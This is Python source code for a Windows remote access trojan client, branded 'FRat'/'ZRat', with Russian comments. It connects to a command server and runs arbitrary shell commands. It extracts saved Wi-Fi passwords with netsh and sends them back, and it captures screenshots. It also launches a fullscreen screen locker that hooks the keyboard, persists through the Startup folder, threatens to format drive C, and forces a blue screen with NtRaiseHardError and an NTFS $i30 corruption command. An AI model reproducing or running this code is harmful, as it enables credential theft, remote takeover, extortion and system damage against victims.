import socket
import subprocess
import requests
import ctypes
import sys
import os
import tkinter as tk
from tkinter import scrolledtext, messagebox, ttk
import threading
import re
import json
import locale
import getpass
import keyboard
import ctypes.wintypes
from functools import partial
import random
import pyautogui
import numpy as np
from PIL import Image, ImageTk
import time
import cv2

kernel32 = ctypes.windll.kernel32

class MultiMonitorApp:
    """Класс для демонстрации нескольких мониторов"""
    
    def __init__(self):
        self.running = True
        self.update_delay = 30  # ms
        self.monitor_images = []

    def run(self):
        """Запуск приложения"""
        self.window = tk.Tk()
        self.window.title("Демонстрация нескольких мониторов")
        
        try:
            self.monitors = self.get_monitors_info()
            self.num_monitors = len(self.monitors)
            
            if self.num_monitors == 0:
                raise ValueError("Не обнаружено подключенных мониторов")
            
            self.setup_ui()
            self.start_update_thread()
            self.window.mainloop()
            
        except ValueError as e:
            print(e)
            self.window.destroy()

    def get_monitors_info(self):
        """Получаем информацию о мониторах"""
        try:
            return [{'index': i} for i in range(pyautogui.screenshot().size[0] // pyautogui.size()[0])] or [{'index': 0}]
        except:
            return [{'index': 0}]

    def setup_ui(self):
        """Настройка пользовательского интерфейса"""
        self.main_frame = ttk.Frame(self.window)
        self.main_frame.pack(fill=tk.BOTH, expand=True)
        
        self.monitor_canvases = []
        self.monitor_frames = []
        
        for i in range(self.num_monitors):
            frame = ttk.LabelFrame(self.main_frame, text=f"Монитор {i+1}")
            frame.pack(side=tk.LEFT if i == 0 else tk.RIGHT, 
                      padx=10, pady=10, 
                      fill=tk.BOTH, expand=True)
            self.monitor_frames.append(frame)
            
            canvas = tk.Canvas(frame)
            canvas.pack(fill=tk.BOTH, expand=True)
            self.monitor_canvases.append(canvas)
        
        self.setup_control_panel()

    def setup_control_panel(self):
        """Настройка панели управления"""
        self.control_frame = ttk.Frame(self.window)
        self.control_frame.pack(fill=tk.X, padx=10, pady=5)
        
        self.btn_capture_all = ttk.Button(self.control_frame, 
                                        text="Снять все экраны", 
                                        command=self.capture_all_screens)
        self.btn_capture_all.pack(side=tk.LEFT, padx=5)
        
        for i in range(self.num_monitors):
            btn = ttk.Button(self.control_frame, 
                           text=f"Снять монитор {i+1}", 
                           command=lambda idx=i: self.capture_single_screen(idx))
            btn.pack(side=tk.LEFT, padx=5)
        
        self.btn_exit = ttk.Button(self.control_frame, text="Выход", command=self.close)
        self.btn_exit.pack(side=tk.RIGHT, padx=5)

    def start_update_thread(self):
        """Запуск потока обновления экранов"""
        self.update_thread = threading.Thread(target=self.update_screens, daemon=True)
        self.update_thread.start()
        self.window.protocol("WM_DELETE_WINDOW", self.close)

    def update_screens(self):
        """Обновление изображений на экранах"""
        while self.running:
            try:
                canvas_sizes = [(c.winfo_width(), c.winfo_height()) for c in self.monitor_canvases]
                full_screenshot = pyautogui.screenshot()
                full_screenshot = np.array(full_screenshot)
                
                screen_width = pyautogui.size()[0]
                for i, (canvas_w, canvas_h) in enumerate(canvas_sizes):
                    if canvas_w > 0 and canvas_h > 0:
                        monitor_img = full_screenshot[:, i*screen_width:(i+1)*screen_width]
                        
                        scale = min(canvas_w / monitor_img.shape[1], 
                                  canvas_h / monitor_img.shape[0])
                        new_width = int(monitor_img.shape[1] * scale)
                        new_height = int(monitor_img.shape[0] * scale)
                        
                        if new_width > 0 and new_height > 0:
                            resized = cv2.resize(monitor_img, (new_width, new_height))
                            if len(self.monitor_images) <= i:
                                self.monitor_images.append(None)
                            self.monitor_images[i] = ImageTk.PhotoImage(
                                image=Image.fromarray(resized))
                            self.monitor_canvases[i].create_image(
                                canvas_w//2, canvas_h//2, 
                                image=self.monitor_images[i], anchor=tk.CENTER)
            
            except Exception as e:
                print(f"Ошибка при обновлении экранов: {e}")
            
            time.sleep(self.update_delay / 1000)

    def capture_all_screens(self):
        """Сохранение скриншотов всех мониторов"""
        timestamp = time.strftime("%Y%m%d_%H%M%S")
        full_screenshot = pyautogui.screenshot()
        screen_width = pyautogui.size()[0]
        
        for i in range(self.num_monitors):
            try:
                filename = f"screen_monitor_{i+1}_{timestamp}.png"
                monitor_img = full_screenshot.crop((
                    i * screen_width, 0,
                    (i + 1) * screen_width, full_screenshot.height
                ))
                monitor_img.save(filename)
                print(f"Снимок монитора {i+1} сохранен как {filename}")
            except Exception as e:
                print(f"Ошибка при сохранении монитора {i+1}: {e}")

    def capture_single_screen(self, monitor_idx):
        """Сохранение скриншота конкретного монитора"""
        if 0 <= monitor_idx < self.num_monitors:
            timestamp = time.strftime("%Y%m%d_%H%M%S")
            filename = f"screen_monitor_{monitor_idx+1}_{timestamp}.png"
            try:
                screen_width = pyautogui.size()[0]
                full_screenshot = pyautogui.screenshot()
                monitor_img = full_screenshot.crop((
                    monitor_idx * screen_width, 0,
                    (monitor_idx + 1) * screen_width, full_screenshot.height
                ))
                monitor_img.save(filename)
                print(f"Снимок монитора {monitor_idx+1} сохранен как {filename}")
            except Exception as e:
                print(f"Ошибка при сохранении монитора {monitor_idx+1}: {e}")

    def close(self):
        """Закрытие приложения"""
        self.running = False
        self.window.destroy()

class WifiPasswordExtractor:
    """Класс для получения сохранённых Wi-Fi сетей и их паролей"""
    
    def __init__(self):
        self.encoding = 'cp866'
        self.timeout = 15
        
    def is_admin(self):
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False
    
    def check_wifi_adapter(self):
        try:
            interface_check = subprocess.run(
                ['netsh', 'interface', 'show', 'interface'],
                capture_output=True,
                text=True,
                encoding=self.encoding,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            return any(x in interface_check.stdout for x in ["Wireless", "Беспроводная"])
        except Exception:
            return False
    
    def get_profiles(self):
        try:
            profiles_output = subprocess.run(
                ['netsh', 'wlan', 'show', 'profiles'],
                capture_output=True,
                text=True,
                encoding=self.encoding,
                shell=True,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            
            if profiles_output.returncode != 0:
                return None
                
            profiles = []
            for line in profiles_output.stdout.split('\n'):
                if "All User Profile" in line or "Все профили пользователей" in line:
                    profile = line.split(':')[-1].strip()
                    if profile:
                        profiles.append(profile)
            return profiles
        except Exception:
            return None
    
    def get_password(self, profile):
        try:
            safe_profile = f'"{profile}"' if ' ' in profile else profile
            password_output = subprocess.run(
                ['netsh', 'wlan', 'show', 'profile', safe_profile, 'key=clear'],
                capture_output=True,
                text=True,
                encoding=self.encoding,
                shell=True,
                creationflags=subprocess.CREATE_NO_WINDOW,
                timeout=self.timeout
            )
            
            if password_output.returncode == 0:
                key_line = [l for l in password_output.stdout.split('\n') 
                          if "Key Content" in l or "Содержимое ключа" in l]
                return key_line[0].split(':')[-1].strip() if key_line else "Пароль не сохранен"
            return "Не удалось получить пароль"
        except Exception as e:
            return f"Ошибка: {str(e)}"
    
    def get_all_passwords(self):
        try:
            if not self.is_admin():
                return {"error": "Требуются права администратора"}

            if not self.check_wifi_adapter():
                return {"error": "Wi-Fi адаптер не активен"}

            profiles = self.get_profiles()
            if not profiles:
                return {"error": "Нет сохраненных Wi-Fi сетей"}

            wifi_data = {}
            for profile in profiles:
                wifi_data[profile] = self.get_password(profile)
            
            return wifi_data if wifi_data else {"error": "Не удалось извлечь пароли"}
        
        except Exception as e:
            return {"error": f"Системная ошибка: {str(e)}"}

class Flocker:
    """Класс для блокировки системы с графическим интерфейсом"""
    
    def __init__(self):
        self.password = "123"
        self.lock_text = "windows blocked.tobi pizda"
        self.count = 3
        self.warning_text = "if you reboot your device then drive C will start auto formatting"
        self.wind = None
        self.enter_pass = None

    class BinaryBackground(tk.Canvas):
        def __init__(self, master, **kwargs):
            super().__init__(master, **kwargs)
            self.configure(bg='black', highlightthickness=0)
            self.place(x=0, y=0, relwidth=1, relheight=1)
            self.draw_binary()
        
        def draw_binary(self):
            self.delete("binary")
            width = self.winfo_width()
            height = self.winfo_height()
            
            num_columns = width // 30
            bits_per_column = height // 20
            
            for col in range(num_columns):
                x = col * 30 + 15
                for row in range(bits_per_column):
                    y = row * 20 + 10
                    self.create_text(
                        x, y,
                        text=random.choice(['0', '1']),
                        font=('Courier New', 12),
                        fill='#ff0000',
                        anchor='center',
                        tags="binary"
                    )
            self.after(100, self.draw_binary)

    def buton(self, arg):
        self.enter_pass.insert(tk.END, arg)

    def delbuton(self):
        self.enter_pass.delete(-1, tk.END)

    def tapp(self, key):
        pass

    def check(self):
        self.count -= 1
        if self.enter_pass.get() == self.password:
            messagebox.showinfo("FRat","UNLOCKED SUCCESSFULLY")
            uninstall(self.wind)
        else:
            if self.count == 0:
                messagebox.showwarning("FRat", "number of attempts expired\n\n" + self.warning_text)
                bsod()
            else:
                messagebox.showwarning("FRat","Wrong password. Avalible tries: "+ str(self.count))

    def exiting(self):
        messagebox.showwarning("FRat", "DEATH IS INEVITABLE\n\n" + self.warning_text)

    def run(self):
        file_path = os.getcwd() + "\\" + os.path.basename(sys.argv[0])
        startup(file_path)

        self.wind = tk.Tk()
        self.wind.title("ZRat")

        self.BinaryBackground(self.wind)

        warning_frame = tk.Frame(self.wind, 
                               bg="white", bd=2, relief="solid", 
                               highlightbackground="blue", highlightthickness=1)
        warning_frame.pack(pady=5)

        warning_label = tk.Label(warning_frame, 
                               bg="white", fg="red", 
                               text=self.warning_text, 
                               font="helvetica 12",
                               padx=5, pady=2)
        warning_label.pack()

        tk.Label(self.wind,bg="black", fg="red",text="WINDOWS LOCKED BY ZRat\n\n\n", font="helvetica 75").pack()
        tk.Label(self.wind,bg="black", fg="red",text=self.lock_text, font="helvetica 40").pack(side=tk.TOP)

        keyboard.on_press(self.tapp, suppress=True)

        self.enter_pass = tk.Entry(self.wind,bg="black", fg="red", text="", font="helvetica 35")
        self.enter_pass.pack()
        self.wind.resizable(0,0)

        self.wind.lift()
        self.wind.attributes('-topmost',True)
        self.wind.after_idle(self.wind.attributes,'-topmost',True)
        self.wind.attributes('-fullscreen', True)

        tk.Button(self.wind,text='unlock',padx="31", pady="19",bg='black',fg='red',font="helvetica 30", command=self.check).pack()
        self.wind.protocol("WM_DELETE_WINDOW", self.exiting)

        for i in range(10):
            tk.Button(self.wind,text=str(i),padx="28", pady="19",bg='black',fg='red',font="helvetica 25", command=partial(self.buton, str(i))).pack(side=tk.LEFT)
                    
        tk.Button(self.wind,text='<',padx="28", pady="19",bg='black',fg='red',font="helvetica 25", command=self.delbuton).pack(side=tk.LEFT)

        self.wind.mainloop()

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def bsod():
    subprocess.call(r"cd C:\:$i30:$bitmap", shell=True)
    ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
    ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, ctypes.byref(ctypes.wintypes.DWORD()))

def startup(path):
    USER_NAME = getpass.getuser()
    global bat_path
    bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
    
    with open(bat_path + '\\' + "open.bat", "w+") as bat_file:
        bat_file.write(r'start "" %s' % path)

def uninstall(wind):
    wind.destroy()
    os.remove(bat_path + '\\' + "open.bat")
    keyboard.unhook_all()
    
def start_client(server_ip, server_port):
    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((server_ip, server_port))

        while True:
            try:
                command = client.recv(4096).decode().strip()
                if not command:
                    continue

                if command.lower() == "exit":
                    break

                if command.lower() == "getwifi":
                    wifi_extractor = WifiPasswordExtractor()
                    wifi_data = wifi_extractor.get_all_passwords()
                    client.send(json.dumps(wifi_data, ensure_ascii=False).encode('utf-8'))
                    continue

                if command.lower() == "lock":
                    flocker = Flocker()
                    flocker.run()
                    continue

                if command.lower() == "demo":
                    monitor_app = MultiMonitorApp()
                    monitor_app.run()
                    continue

                response = handle_command(command)
                client.send(response.encode())

            except Exception as e:
                client.send(f"Ошибка: {str(e)}".encode())

    except Exception as e:
        pass
    finally:
        client.close()

def handle_command(command):
    try:
        if command.lower() == "getid":
            try:
                r = requests.get("https://api.example.com/info", timeout=5)
                return r.text
            except Exception as e:
                return f"Ошибка: {str(e)}"

        tool_commands = {
            "extool": "extool.py",
            "winlock": "fslocker.py", 
            "steal": "thesteal.py",
            "web": "web.py",
            "demo": "demo.py",
            "micro": "micro.py",
            "chat": start_client_chat
        }
        
        for prefix, handler in tool_commands.items():
            if command.lower().startswith(prefix):
                if prefix == "chat":
                    return "Используйте команду chat напрямую"
                
                tool_path = os.path.join(os.path.dirname(__file__), 'tools', handler)
                args = command.split()[1:] if ' ' in command else []
                
                try:
                    result = subprocess.run(
                        ['python', tool_path] + args,
                        capture_output=True,
                        text=True,
                        timeout=30
                    )
                    return result.stdout if result.returncode == 0 else result.stderr
                except Exception as e:
                    return f"Ошибка инструмента: {str(e)}"

        result = subprocess.run(
            command,
            shell=True,
            capture_output=True,
            text=True,
            timeout=60
        )
        return result.stdout if result.returncode == 0 else result.stderr

    except Exception as e:
        return f"Ошибка выполнения команды: {str(e)}"

def start_client_chat(client_socket):
    def receive_messages():
        while True:
            try:
                message = client_socket.recv(4096).decode()
                if not message:
                    break
                chat_text.insert(tk.END, f"[Сервер]: {message}\n")
                chat_text.see(tk.END)
            except (ConnectionResetError, BrokenPipeError):
                break

    root = tk.Tk()
    root.title("Клиентский чат")
    root.geometry("500x400")
    root.protocol("WM_DELETE_WINDOW", lambda: root.quit())

    chat_text = scrolledtext.ScrolledText(root, wrap=tk.WORD, width=60, height=20)
    chat_text.pack(padx=10, pady=10, fill=tk.BOTH, expand=True)

    input_frame = tk.Frame(root)
    input_frame.pack(padx=10, pady=5, fill=tk.X)

    entry = tk.Entry(input_frame, width=50)
    entry.pack(side=tk.LEFT, fill=tk.X, expand=True)

    def send_message():
        message = entry.get()
        if message:
            chat_text.insert(tk.END, f"[Вы]: {message}\n")
            chat_text.see(tk.END)
            client_socket.send(message.encode())
            entry.delete(0, tk.END)

    send_btn = tk.Button(input_frame, text="Отправить", command=send_message)
    send_btn.pack(side=tk.RIGHT, padx=5)
    entry.bind("<Return>", lambda e: send_message())

    threading.Thread(target=receive_messages, daemon=True).start()
    root.mainloop()

if __name__ == "__main__":
    if not is_admin():
        print("Требуются права администратора!")
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        sys.exit()

    SERVER_IP = "127.0.0.1"
    SERVER_PORT = 5555

    try:
        start_client(SERVER_IP, SERVER_PORT)
    except KeyboardInterrupt:
        print("\nКлиент завершен")
        sys.exit(0)

# Пример использования
wifi_extractor = WifiPasswordExtractor()
wifi_data = wifi_extractor.get_all_passwords()

for network, password in wifi_data.items():
    print(f"Сеть: {network}\nПароль: {password}\n")